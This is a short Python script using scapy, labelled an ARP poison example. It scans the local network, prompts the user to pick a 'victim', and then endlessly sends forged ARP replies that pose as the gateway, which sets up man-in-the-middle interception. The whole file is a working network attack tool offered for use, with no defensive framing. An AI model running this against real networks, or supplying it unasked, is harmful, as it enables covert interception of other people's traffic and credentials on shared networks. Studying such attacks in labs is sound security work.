#!/usr/bin/python

# Python arp poison example script
# Written by aviran
# visit for more details aviran.org

from scapy.all import *
import sys
from utils.arpScanner import arp_scan
from utils.network import *
from utils.tools import *

def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac
Timeout=2

def arpSpoofing(target_ip, gateway_ip):
    my_mac = get_mac_address()
    if not my_mac:
        print "Cant get local mac address, quitting"
        sys.exit(1)
    packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=gateway_ip,pdst=target_ip)
    while 1:
        sendp(packet)

if len(sys.argv) != 2:
    print "Usage: arp_poison.py HOST_TO_IMPERSONATE"
    sys.exit(1)

my_interface = select_interface()
target_list = arp_scan(my_interface)
target = select_val(target_list,"Please select a victim:")
arpSpoofing(target,sys.argv[1])
